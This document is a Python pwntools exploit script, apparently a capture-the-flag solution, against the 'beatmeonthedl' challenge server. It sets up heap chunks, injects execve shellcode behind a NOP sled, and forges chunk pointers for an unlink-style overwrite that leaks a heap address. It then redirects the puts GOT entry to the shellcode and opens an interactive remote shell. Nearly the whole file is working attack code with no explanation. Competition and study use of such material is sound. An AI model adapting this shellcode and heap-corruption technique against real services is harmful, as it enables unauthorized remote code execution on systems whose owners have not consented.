from pwn import * 

context.bits = 64

def send_req(req):

        p.sendline('1')
	print p.recvuntil('>')
        p.sendline(req)
        print p.recvuntil('| ')

def del_req(opt):

	p.sendline('3')
	print p.recvuntil(':')
	p.sendline(str(opt))
	

def print_req():

	p.sendline('2')	
	msg = p.recvuntil('.')
	msg,leak = msg.split('5) ')
        leak,junk = leak.split('6)')
        leak = leak.strip('\n')
        context.bits = len(leak)*8
        leak = unpack(leak)
        print "[+] leak "+hex(leak)
        print p.recvuntil('| ')
        return leak 

def change_req(opt,data):

	p.sendline('4')
	print p.recvuntil(':')
	p.sendline(str(opt))
	print p.recvuntil(':')
	p.sendline(data)
	print p.recvuntil('| ')		
		

#p = process('./beatmeonthedl')

p = remote('beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me', 6969)

print p.recvuntil(':')

p.sendline('mcfly')

print p.recvuntil(':')

p.sendline('awesnap')

print p.recvuntil('| ')

send_req("A"*10)
send_req("B"*10)
send_req("C"*10)
send_req("D"*10)
send_req("E"*10)
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
send_req('\xeb\x20'+"\x90"*32+shellcode)

old = 0x609ea8-24  # 5'th chunk 
new = 0x609ea0  # 4'th chunk 
payload = "\x00"*64+pack(old)+pack(new)

change_req(3,payload)


del_req(3)
print p.recvuntil('| ')

heap_leak = print_req()

#print "[+] 4'th chunk addr"+hex(unpack(leak))
context.bits = 64
puts = 0x609940

payload = "\x00"*64+pack(puts)+pack(heap_leak+64)

change_req(0,payload)

del_req(0)


#p.sendline(str(5))

p.interactive()
